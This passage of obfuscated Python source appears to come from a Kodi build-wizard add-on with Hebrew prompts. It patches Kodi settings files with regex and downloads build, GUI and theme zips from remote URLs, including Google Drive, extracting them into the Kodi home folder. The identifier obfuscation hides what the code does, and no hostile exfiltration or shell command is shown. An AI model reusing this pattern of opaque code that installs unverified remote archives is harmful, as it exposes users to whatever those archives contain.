			OOOO00OOO0O0OOOO0 .close ()#line:3856
			OOO0O0O0OOOOOOOO0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3857
			O00OO0000000O0OOO =re .compile (OOO0O0O0OOOOOOOO0 ).findall (O0OO0OOO00O000OOO )[0 ]#line:3858
			OOOO00OOO0O0OOOO0 =open (O0000O0OOOO000000 ,'w')#line:3859
			OOOO00OOO0O0OOOO0 .write (O0OO0OOO00O000OOO .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O00OO0000000O0OOO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3860
			OOOO00OOO0O0OOOO0 .close ()#line:3861
		except :#line:3862
				pass #line:3863
		wiz .kodi17Fix ()#line:3864
		O0000O0OOOO000000 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3865
		try :#line:3866
			OOOO00OOO0O0OOOO0 =open (O0000O0OOOO000000 ,'r')#line:3867
			O0OO0OOO00O000OOO =OOOO00OOO0O0OOOO0 .read ()#line:3868
			OOOO00OOO0O0OOOO0 .close ()#line:3869
			OOO0O0O0OOOOOOOO0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3870
			O00OO0000000O0OOO =re .compile (OOO0O0O0OOOOOOOO0 ).findall (O0OO0OOO00O000OOO )[0 ]#line:3871
			OOOO00OOO0O0OOOO0 =open (O0000O0OOOO000000 ,'w')#line:3872
			OOOO00OOO0O0OOOO0 .write (O0OO0OOO00O000OOO .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O00OO0000000O0OOO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3873
			OOOO00OOO0O0OOOO0 .close ()#line:3874
		except :#line:3875
				pass #line:3876
		swapSkins ('skin.Premium.mod')#line:3877
def buildWizard (OOO00OOO000OOOOOO ,OOOO0O0O000O0OO0O ,theme =None ,over =False ):#line:3880
	if over ==False :#line:3881
		O000O0O0O0OOOOO00 =wiz .checkBuild (OOO00OOO000OOOOOO ,'url')#line:3882
		if O000O0O0O0OOOOO00 ==False :#line:3884
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3889
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3890
			return #line:3891
		OO00O00OOOO0O0O00 =wiz .workingURL (O000O0O0O0OOOOO00 )#line:3892
		if OO00O00OOOO0O0O00 ==False :#line:3893
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO00O00OOOO0O0O00 ))#line:3894
			return #line:3895
	if OOOO0O0O000O0OO0O =='gui':#line:3896
		if OOO00OOO000OOOOOO ==BUILDNAME :#line:3897
			if over ==True :O0O0OO0OOO0OOO0O0 =1 #line:3898
			else :O0O0OO0OOO0OOO0O0 =1 #line:3899
		else :#line:3900
			O0O0OO0OOO0OOO0O0 =1 #line:3901
		if O0O0OO0OOO0OOO0O0 :#line:3902
			remove_addons ()#line:3903
			remove_addons2 ()#line:3904
			OO0O0OOOO0000O0O0 =wiz .checkBuild (OOO00OOO000OOOOOO ,'gui')#line:3905
			O0000O0000OOO00OO =OOO00OOO000OOOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3906
			if not wiz .workingURL (OO0O0OOOO0000O0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3907
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3908
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00OOO000OOOOOO ),'','אנא המתן')#line:3909
			O0OOO0O0O00OO0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0000O0000OOO00OO )#line:3910
			try :os .remove (O0OOO0O0O00OO0O00 )#line:3911
			except :pass #line:3912
			logging .warning (OO0O0OOOO0000O0O0 )#line:3913
			if 'google'in OO0O0OOOO0000O0O0 :#line:3914
			   OO0OO000O000O000O =googledrive_download (OO0O0OOOO0000O0O0 ,O0OOO0O0O00OO0O00 ,DP ,wiz .checkBuild (OOO00OOO000OOOOOO ,'filesize'))#line:3915
			else :#line:3918
			  downloader .download (OO0O0OOOO0000O0O0 ,O0OOO0O0O00OO0O00 ,DP )#line:3919
			xbmc .sleep (100 )#line:3920
			O0O00O0O0O0O0O0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00OOO000OOOOOO )#line:3921
			DP .update (0 ,O0O00O0O0O0O0O0OO ,'','אנא המתן')#line:3922
			extract .all (O0OOO0O0O00OO0O00 ,HOME ,DP ,title =O0O00O0O0O0O0O0OO )#line:3923
			DP .close ()#line:3924
			wiz .defaultSkin ()#line:3925
			wiz .lookandFeelData ('save')#line:3926
			wiz .kodi17Fix ()#line:3927
			if KODIV >=18 :#line:3928
				skindialogsettind18 ()#line:3929
			xbmc .executebuiltin ("ReloadSkin()")#line:3930
			if INSTALLMETHOD ==1 :OO0O00O000OO0OO00 =1 #line:3931
			elif INSTALLMETHOD ==2 :OO0O00O000OO0OO00 =0 #line:3932
			else :DP .close ()#line:3933
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3934
			update_Votes ()#line:3935
			indicatorfastupdate ()#line:3936
		else :#line:3938
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3939
	if OOOO0O0O000O0OO0O =='gui2':#line:3940
		if OOO00OOO000OOOOOO ==BUILDNAME :#line:3941
			if over ==True :O0O0OO0OOO0OOO0O0 =1 #line:3942
			else :O0O0OO0OOO0OOO0O0 =1 #line:3943
		else :#line:3944
			O0O0OO0OOO0OOO0O0 =1 #line:3945
		if O0O0OO0OOO0OOO0O0 :#line:3946
			remove_addons ()#line:3947
			remove_addons2 ()#line:3948
			OO0O0OOOO0000O0O0 =wiz .checkBuild (OOO00OOO000OOOOOO ,'gui')#line:3949
			O0000O0000OOO00OO =OOO00OOO000OOOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3950
			if not wiz .workingURL (OO0O0OOOO0000O0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3951
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3952
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00OOO000OOOOOO ),'','אנא המתן')#line:3953
			O0OOO0O0O00OO0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0000O0000OOO00OO )#line:3954
			try :os .remove (O0OOO0O0O00OO0O00 )#line:3955
			except :pass #line:3956
			logging .warning (OO0O0OOOO0000O0O0 )#line:3957
			if 'google'in OO0O0OOOO0000O0O0 :#line:3958
			   OO0OO000O000O000O =googledrive_download (OO0O0OOOO0000O0O0 ,O0OOO0O0O00OO0O00 ,DP ,wiz .checkBuild (OOO00OOO000OOOOOO ,'filesize'))#line:3959
			else :#line:3962
			  downloader .download (OO0O0OOOO0000O0O0 ,O0OOO0O0O00OO0O00 ,DP )#line:3963
			xbmc .sleep (100 )#line:3964
			O0O00O0O0O0O0O0OO ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00OOO000OOOOOO )#line:3965
			DP .update (0 ,O0O00O0O0O0O0O0OO ,'','אנא המתן')#line:3966
			extract .all (O0OOO0O0O00OO0O00 ,HOME ,DP ,title =O0O00O0O0O0O0O0OO )#line:3967
			DP .close ()#line:3968
			wiz .defaultSkin ()#line:3969
			wiz .lookandFeelData ('save')#line:3970
			if INSTALLMETHOD ==1 :OO0O00O000OO0OO00 =1 #line:3973
			elif INSTALLMETHOD ==2 :OO0O00O000OO0OO00 =0 #line:3974
			else :DP .close ()#line:3975
		else :#line:3977
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3978
	elif OOOO0O0O000O0OO0O =='fresh':#line:3979
		freshStart (OOO00OOO000OOOOOO )#line:3980
	elif OOOO0O0O000O0OO0O =='normal':#line:3981
		if url =='normal':#line:3982
			if KEEPTRAKT =='true':#line:3983
				traktit .autoUpdate ('all')#line:3984
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3985
			if KEEPREAL =='true':#line:3986
				debridit .autoUpdate ('all')#line:3987
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3988
			if KEEPLOGIN =='true':#line:3989
				loginit .autoUpdate ('all')#line:3990
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3991
		O0OOO000OO00000O0 =int (KODIV );O0OOOO000O0O0OO0O =int (float (wiz .checkBuild (OOO00OOO000OOOOOO ,'kodi')))#line:3992
		if not O0OOO000OO00000O0 ==O0OOOO000O0O0OO0O :#line:3993
			if O0OOO000OO00000O0 ==16 and O0OOOO000O0O0OO0O <=15 :OOOO0O00O0O0OO0OO =False #line:3994
			else :OOOO0O00O0O0OO0OO =True #line:3995
		else :OOOO0O00O0O0OO0OO =False #line:3996
		if OOOO0O00O0O0OO0OO ==True :#line:3997
			OOOOOOO00000OO00O =1 #line:3998
		else :#line:3999
			if not over ==False :OOOOOOO00000OO00O =1 #line:4000
			else :OOOOOOO00000OO00O =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4001
		if OOOOOOO00000OO00O :#line:4002
			wiz .clearS ('build')#line:4003
			OO0O0OOOO0000O0O0 =wiz .checkBuild (OOO00OOO000OOOOOO ,'url')#line:4004
			O0000O0000OOO00OO =OOO00OOO000OOOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4005
			if not wiz .workingURL (OO0O0OOOO0000O0O0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4006
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4007
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00OOO000OOOOOO ,wiz .checkBuild (OOO00OOO000OOOOOO ,'version')),'','אנא המתן')#line:4008
			O0OOO0O0O00OO0O00 =os .path .join (PACKAGES ,'%s.zip'%O0000O0000OOO00OO )#line:4009
			try :os .remove (O0OOO0O0O00OO0O00 )#line:4010
			except :pass #line:4011
			logging .warning (OO0O0OOOO0000O0O0 )#line:4012
			if 'google'in OO0O0OOOO0000O0O0 :#line:4013
			   OO0OO000O000O000O =googledrive_download (OO0O0OOOO0000O0O0 ,O0OOO0O0O00OO0O00 ,DP ,wiz .checkBuild (OOO00OOO000OOOOOO ,'filesize'))#line:4014
			else :#line:4017
			  downloader .download (OO0O0OOOO0000O0O0 ,O0OOO0O0O00OO0O00 ,DP )#line:4018
			xbmc .sleep (1000 )#line:4019
			O0O00O0O0O0O0O0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00OOO000OOOOOO ,wiz .checkBuild (OOO00OOO000OOOOOO ,'version'))#line:4020
			DP .update (0 ,O0O00O0O0O0O0O0OO ,'','Please Wait')#line:4021
			OOOO000OOO0OO000O ,O0000O000O0000O00 ,O0O0OO00OOOOOOOOO =extract .all (O0OOO0O0O00OO0O00 ,HOME ,DP ,title =O0O00O0O0O0O0O0OO )#line:4022
			if int (float (OOOO000OOO0OO000O ))>0 :#line:4023
				try :#line:4024
					wiz .fixmetas ()#line:4025
				except :pass #line:4026
				wiz .lookandFeelData ('save')#line:4027
				wiz .defaultSkin ()#line:4028
				wiz .setS ('buildname',OOO00OOO000OOOOOO )#line:4030
				wiz .setS ('buildversion',wiz .checkBuild (OOO00OOO000OOOOOO ,'version'))#line:4031
				wiz .setS ('buildtheme','')#line:4032
				wiz .setS ('latestversion',wiz .checkBuild (OOO00OOO000OOOOOO ,'version'))#line:4033
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4034
				wiz .setS ('installed','true')#line:4035
				wiz .setS ('extract',str (OOOO000OOO0OO000O ))#line:4036
				wiz .setS ('errors',str (O0000O000O0000O00 ))#line:4037
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOOO000OOO0OO000O ,O0000O000O0000O00 ))#line:4038
				OOO0O00O000OO00O0 =(ADDON .getSetting ("gaiaseren"))#line:4040
				if OOO0O00O000OO00O0 =='true':#line:4041
					wiz .kodi17Fix ()#line:4042
				fastupdatefirstbuild (NOTEID )#line:4043
				skin_homeselect ()#line:4044
				skin_lower ()#line:4045
				rdbuildinstall ()#line:4046
				try :gaiaserenaddon ()#line:4048
				except :pass #line:4049
				adults18 ()#line:4050
				skinfix18 ()#line:4051
				try :os .remove (O0OOO0O0O00OO0O00 )#line:4053
				except :pass #line:4054
				if OOO0O00O000OO00O0 =='true':#line:4055
					wiz .kodi17Fix ()#line:4056
				OO0O0OOOOOO00OOO0 =(ADDON .getSetting ("auto_rd"))#line:4057
				if OO0O0OOOOOO00OOO0 =='true':#line:4058
					try :#line:4059
						setautorealdebrid ()#line:4060
					except :pass #line:4061
				try :#line:4062
					autotrakt ()#line:4063
				except :pass #line:4064
				O00O000OO00OOO0OO =(ADDON .getSetting ("imdb_on"))#line:4065
				if O00O000OO00OOO0OO =='true':#line:4066
					imdb_synck ()#line:4067
				iptvset ()#line:4068
				if int (float (O0000O000O0000O00 ))>0 :#line:4070
					O0O0OO0OOO0OOO0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO00OOO000OOOOOO ,wiz .checkBuild (OOO00OOO000OOOOOO ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OOOO000OOO0OO000O ,'%',COLOR1 ,O0000O000O0000O00 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4071
					if O0O0OO0OOO0OOO0O0 :#line:4072
						if isinstance (O0000O000O0000O00 ,unicode ):#line:4073
							O0O0OO00OOOOOOOOO =O0O0OO00OOOOOOOOO .encode ('utf-8')#line:4074
						wiz .TextBox (ADDONTITLE ,O0O0OO00OOOOOOOOO )#line:4075
				DP .close ()#line:4076
				O0O0000000OOOOOOO =wiz .themeCount (OOO00OOO000OOOOOO )#line:4077
				builde_Votes ()#line:4078
				indicator ()#line:4079
				if not O0O0000000OOOOOOO ==False :#line:4080
					buildWizard (OOO00OOO000OOOOOO ,'theme')#line:4081
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4082
				if INSTALLMETHOD ==1 :OO0O00O000OO0OO00 =1 #line:4083
				elif INSTALLMETHOD ==2 :OO0O00O000OO0OO00 =0 #line:4084
				else :resetkodi ()#line:4085
				if OO0O00O000OO0OO00 ==1 :wiz .reloadFix ()#line:4087
				else :wiz .killxbmc (True )#line:4088
			else :#line:4089
				if isinstance (O0000O000O0000O00 ,unicode ):#line:4090
					O0O0OO00OOOOOOOOO =O0O0OO00OOOOOOOOO .encode ('utf-8')#line:4091
				O0O00O00000OOO000 =open (O0OOO0O0O00OO0O00 ,'r')#line:4092
				O000O0O0OO0000OOO =O0O00O00000OOO000 .read ()#line:4093
				O0O0O0O0O00O000O0 =''#line:4094
				for O00O0O0OO0OOO0O0O in OO0OO000O000O000O :#line:4095
				  O0O0O0O0O00O000O0 ='key: '+O0O0O0O0O00O000O0 +'\n'+O00O0O0OO0OOO0O0O #line:4096
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O0OO00OOOOOOOOO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O0O0O0O0O00O000O0 )#line:4097
		else :#line:4098
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4099
	elif OOOO0O0O000O0OO0O =='theme':#line:4100
		if theme ==None :#line:4101
			O0O0000000OOOOOOO =wiz .checkBuild (OOO00OOO000OOOOOO ,'theme')#line:4102
			OOO00O000O00O0000 =[]#line:4103
			if not O0O0000000OOOOOOO =='http://'and wiz .workingURL (O0O0000000OOOOOOO )==True :#line:4104
				OOO00O000O00O0000 =wiz .themeCount (OOO00OOO000OOOOOO ,False )#line:4105
				if len (OOO00O000O00O0000 )>0 :#line:4106
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOO00OOO000OOOOOO ,COLOR1 ,len (OOO00O000O00O0000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4107
						wiz .log ("Theme List: %s "%str (OOO00O000O00O0000 ))#line:4108
						OOO00OO0000000OO0 =DIALOG .select (ADDONTITLE ,OOO00O000O00O0000 )#line:4109
						wiz .log ("Theme install selected: %s"%OOO00OO0000000OO0 )#line:4110
						if not OOO00OO0000000OO0 ==-1 :theme =OOO00O000O00O0000 [OOO00OO0000000OO0 ];O0OOOO00OO000O0OO =True #line:4111
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4112
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4113
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4114
		else :O0OOOO00OO000O0OO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOO00OOO000OOOOOO ,wiz .checkBuild (OOO00OOO000OOOOOO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4115
		if O0OOOO00OO000O0OO :#line:4116
			OO00OOOOO000OOO0O =wiz .checkTheme (OOO00OOO000OOOOOO ,theme ,'url')#line:4117
			O0000O0000OOO00OO =OOO00OOO000OOOOOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4118
			if not wiz .workingURL (OO00OOOOO000OOO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4119
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4120
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4121
			O0OOO0O0O00OO0O00 =os .path .join (PACKAGES ,'%s.zip'%O0000O0000OOO00OO )#line:4122
			try :os .remove (O0OOO0O0O00OO0O00 )#line:4123
			except :pass #line:4124
			downloader .download (OO00OOOOO000OOO0O ,O0OOO0O0O00OO0O00 ,DP )#line:4125
			xbmc .sleep (1000 )#line:4126
			DP .update (0 ,"","Installing %s "%OOO00OOO000OOOOOO )#line:4127
			O000OO0O0O00OO000 =False #line:4128
			if url not in ["fresh","normal"]:#line:4129
				O000OO0O0O00OO000 =testTheme (O0OOO0O0O00OO0O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4130
				OOOO0O0OOO0OOOO0O =testGui (O0OOO0O0O00OO0O00 )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4131
				if O000OO0O0O00OO000 ==True :#line:4132
					wiz .lookandFeelData ('save')#line:4133
					OO0OOOOOOOO0000O0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4134
					O0O0OOOOOOO0OOOO0 =xbmc .getSkinDir ()#line:4135
					skinSwitch .swapSkins (OO0OOOOOOOO0000O0 )#line:4137
					OO0O0OO0O00OOO0O0 =0 #line:4138
					xbmc .sleep (1000 )#line:4139
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0OO0O00OOO0O0 <150 :#line:4140
						OO0O0OO0O00OOO0O0 +=1 #line:4141
						xbmc .sleep (1000 )#line:4142
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4143
						wiz .ebi ('SendClick(11)')#line:4144
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4145
					xbmc .sleep (1000 )#line:4146
			O0O00O0O0O0O0O0OO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4147
			DP .update (0 ,O0O00O0O0O0O0O0OO ,'','אנא המתן')#line:4148
			OOOO000OOO0OO000O ,O0000O000O0000O00 ,O0O0OO00OOOOOOOOO =extract .all (O0OOO0O0O00OO0O00 ,HOME ,DP ,title =O0O00O0O0O0O0O0OO )#line:4149
			wiz .setS ('buildtheme',theme )#line:4150
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOOO000OOO0OO000O ,O0000O000O0000O00 ))#line:4151
			DP .close ()#line:4152
			if url not in ["fresh","normal"]:#line:4153
				wiz .forceUpdate ()#line:4154
				if KODIV >=17 :wiz .kodi17Fix ()#line:4155
				if OOOO0O0OOO0OOOO0O ==True :#line:4156
					wiz .lookandFeelData ('save')#line:4157
					wiz .defaultSkin ()#line:4158
					O0O0OOOOOOO0OOOO0 =wiz .getS ('defaultskin')#line:4159
					skinSwitch .swapSkins (O0O0OOOOOOO0OOOO0 )#line:4160
					OO0O0OO0O00OOO0O0 =0 #line:4161
					xbmc .sleep (1000 )#line:4162
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0OO0O00OOO0O0 <150 :#line:4163
						OO0O0OO0O00OOO0O0 +=1 #line:4164
						xbmc .sleep (1000 )#line:4165
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4167
						wiz .ebi ('SendClick(11)')#line:4168
					wiz .lookandFeelData ('restore')#line:4169
				elif O000OO0O0O00OO000 ==True :#line:4170
					skinSwitch .swapSkins (O0O0OOOOOOO0OOOO0 )#line:4171
					OO0O0OO0O00OOO0O0 =0 #line:4172
					xbmc .sleep (1000 )#line:4173
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0O0OO0O00OOO0O0 <150 :#line:4174
						OO0O0OO0O00OOO0O0 +=1 #line:4175
						xbmc .sleep (1000 )#line:4176
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4178
						wiz .ebi ('SendClick(11)')#line:4179
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4180
					wiz .lookandFeelData ('restore')#line:4181
				else :#line:4182
					wiz .ebi ("ReloadSkin()")#line:4183
					xbmc .sleep (1000 )#line:4184
					wiz .ebi ("Container.Refresh")#line:4185
		else :#line:4186
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4187
def skin_homeselect ():#line:4191
	try :#line:4193
		O0OO00O000OO0O0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4194
		OOOO00OO00OOO0OOO =open (O0OO00O000OO0O0OO ,'r')#line:4196
		O0OOOO000000OOO0O =OOOO00OO00OOO0OOO .read ()#line:4197
		OOOO00OO00OOO0OOO .close ()#line:4198
		OOO000OOO0OO000OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4199
		OO0000OO0OO0O00O0 =re .compile (OOO000OOO0OO000OO ).findall (O0OOOO000000OOO0O )[0 ]#line:4200
		OOOO00OO00OOO0OOO =open (O0OO00O000OO0O0OO ,'w')#line:4201
		OOOO00OO00OOO0OOO .write (O0OOOO000000OOO0O .replace ('<setting id="HomeS" type="string%s/setting>'%OO0000OO0OO0O00O0 ,'<setting id="HomeS" type="string"></setting>'))#line:4202
		OOOO00OO00OOO0OOO .close ()#line:4203
	except :#line:4204
		pass #line:4205
def skin_lower ():#line:4208
	OO0O0000OOO0O0000 =(ADDON .getSetting ("lower"))#line:4209
	if OO0O0000OOO0O0000 =='true':#line:4210
		try :#line:4213
			OOOOOOOO0OOOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4214
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'r')#line:4216
			O0OOOO0OO00O0OO00 =OO00OO0000000OOO0 .read ()#line:4217
			OO00OO0000000OOO0 .close ()#line:4218
			OOO00000O000O0OO0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4219
			O0O0OO0OOO0O00000 =re .compile (OOO00000O000O0OO0 ).findall (O0OOOO0OO00O0OO00 )[0 ]#line:4220
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'w')#line:4221
			OO00OO0000000OOO0 .write (O0OOOO0OO00O0OO00 .replace ('<setting id="none_widget" type="bool%s/setting>'%O0O0OO0OOO0O00000 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4222
			OO00OO0000000OOO0 .close ()#line:4223
			OOOOOOOO0OOOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4225
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'r')#line:4227
			O0OOOO0OO00O0OO00 =OO00OO0000000OOO0 .read ()#line:4228
			OO00OO0000000OOO0 .close ()#line:4229
			OOO00000O000O0OO0 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4230
			O0O0OO0OOO0O00000 =re .compile (OOO00000O000O0OO0 ).findall (O0OOOO0OO00O0OO00 )[0 ]#line:4231
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'w')#line:4232
			OO00OO0000000OOO0 .write (O0OOOO0OO00O0OO00 .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%O0O0OO0OOO0O00000 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4233
			OO00OO0000000OOO0 .close ()#line:4234
			OOOOOOOO0OOOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4236
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'r')#line:4238
			O0OOOO0OO00O0OO00 =OO00OO0000000OOO0 .read ()#line:4239
			OO00OO0000000OOO0 .close ()#line:4240
			OOO00000O000O0OO0 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4241
			O0O0OO0OOO0O00000 =re .compile (OOO00000O000O0OO0 ).findall (O0OOOO0OO00O0OO00 )[0 ]#line:4242
			OO00OO0000000OOO0 =open (OOOOOOOO0OOOO0O00 ,'w')#line:4243
			OO00OO0000000OOO0 .write (O0OOOO0OO00O0OO00 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%O0O0OO0OOO0O00000 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4244
			OO00OO0000000OOO0 .close ()#line:4245
